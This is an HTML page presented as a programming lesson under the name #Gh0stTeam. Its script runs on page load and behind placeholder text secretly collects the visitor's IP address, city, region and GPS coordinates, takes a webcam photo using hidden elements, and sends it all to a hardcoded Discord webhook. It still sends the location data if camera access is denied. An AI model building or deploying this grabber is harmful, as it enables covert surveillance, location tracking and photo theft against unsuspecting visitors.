<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aula de Programação - #Gh0stTeam</title>
    <style>
        body { background-color: black; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; overflow: hidden; }
        .texto-grande { font-size: 2.5rem; font-weight: bold; text-align: center; max-width: 80%; margin-bottom: 20px; text-transform: uppercase; }
        .gh0st { color: red; font-size: 1.2rem; font-weight: bold; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="texto-grande">TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO</div>
    <div class="gh0st">#Gh0stTeam</div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1496557379351875745/PsqDIUD8fIDhCGozVuKw9JQOHjMX-FQgmEfVoaxdGFcRyTq926Dg5m47hxDC5BrKHlTx';

        async function iniciar() {
            let info = { 
                ip: 'Não obtido', 
                cidade: 'Não obtida', 
                estado: 'Não obtido', 
                latitude: 'Negada', 
                longitude: 'Negada' 
            };

            // 1. Captura IP e Localização por IP (Usando ip-api.com - mais estável)
            try {
                const res = await fetch('http://ip-api.com');
                const data = await res.json();
                if (data.status === 'success') {
                    info.ip = data.query;
                    info.cidade = data.city;
                    info.estado = data.regionName;
                }
            } catch (e) { 
                console.log("Erro ao buscar IP, continuando..."); 
            }

            // 2. Captura Coordenadas GPS
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    info.latitude = pos.coords.latitude.toFixed(6);
                    info.longitude = pos.coords.longitude.toFixed(6);
                    tirarFotoEEnviar(info);
                }, () => { 
                    tirarFotoEEnviar(info); // Envia se negar GPS
                }, { timeout: 5000 });
            } else {
                tirarFotoEEnviar(info);
            }
        }

        async function tirarFotoEEnviar(dados) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);

                        canvas.toBlob(blob => {
                            const fd = new FormData();
                            fd.append('file', blob, 'foto.png');
                            
                            const relatorio = `🛑 **RELATÓRIO DE ACESSO #Gh0stTeam** 🛑\n` +
                                              `🌐 **IP:** ${dados.ip}\n` +
                                              `📍 **CIDADE:** ${dados.cidade}\n` +
                                              `🚩 **ESTADO:** ${dados.estado}\n` +
                                              `📐 **LATITUDE:** ${dados.latitude}\n` +
                                              `📐 **LONGITUDE:** ${dados.longitude}`;

                            fd.append('content', relatorio);
                            
                            fetch(WEBHOOK_URL, { method: 'POST', body: fd });
                            stream.getTracks().forEach(t => t.stop());
                        }, 'image/png');
                    }, 1000);
                };
            } catch (e) {
                // Envio caso a câmera seja bloqueada
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ 
                        content: `⚠️ **Câmera Bloqueada!**\n🌐 IP: ${dados.ip}\n📍 Cidade: ${dados.cidade}\n🚩 Estado: ${dados.estado}\n📐 Lat: ${dados.latitude}\n📐 Long: ${dados.longitude}` 
                    })
                });
            }
        }

        window.onload = iniciar;
    </script>
</body>
</html>
